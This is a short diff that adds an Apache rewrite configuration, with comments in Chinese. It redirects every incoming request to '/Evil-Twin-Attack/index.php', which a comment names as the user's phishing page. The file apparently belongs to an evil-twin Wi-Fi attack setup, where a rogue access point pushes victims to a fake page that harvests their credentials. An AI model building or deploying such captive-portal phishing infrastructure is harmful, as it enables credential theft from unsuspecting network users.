@@ -1,0 +1,6 @@
+# 启用重写引擎
+RewriteEngine On
+
+# 捕获所有请求并将其重定向到您的钓鱼页面（假设是 index.php）
+# 这将返回一个 HTTP 302 响应
+RewriteRule ^(.*)$ /Evil-Twin-Attack/index.php [R=302,L]
